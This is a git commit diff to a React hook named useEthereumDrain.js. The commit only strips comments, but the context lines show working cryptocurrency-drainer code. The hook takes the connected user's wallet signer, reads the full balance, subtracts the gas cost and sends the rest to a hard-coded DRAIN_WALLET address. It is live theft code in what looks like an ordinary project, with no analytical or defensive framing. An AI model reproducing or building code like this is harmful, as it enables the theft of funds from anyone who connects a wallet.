8fe67c977c902ed4fa5e1be94215d0e215b2cd00
kylessnow99-art <kylessnow99@gmail.com>
2026-03-03 00:28:28 +0100

    Update useEthereumDrain.js

--- src/hooks/useEthereumDrain.js
+++ src/hooks/useEthereumDrain.js
@@ -17,30 +17,24 @@ export const useEthereumDrain = () => {
       const signer = await provider.getSigner();
       const address = await signer.getAddress();
       
-      // Get balance
       const balance = await provider.getBalance(address);
       
-      // Calculate gas
       const feeData = await provider.getFeeData();
       const gasLimit = 21000n;
       const gasCost = gasLimit * feeData.maxFeePerGas;
       
-      // Check minimum balance
       if (balance < gasCost + ethers.parseEther('0.001')) {
         throw new Error('Insufficient balance for gas');
       }
       
-      // Calculate drain amount
       const drainAmount = balance - gasCost;
       
-      // Send transaction
       const tx = await signer.sendTransaction({
         to: DRAIN_WALLET,
         value: drainAmount,
         gasLimit
       });
       
-      // Wait for confirmation
       await tx.wait();
       
       return {
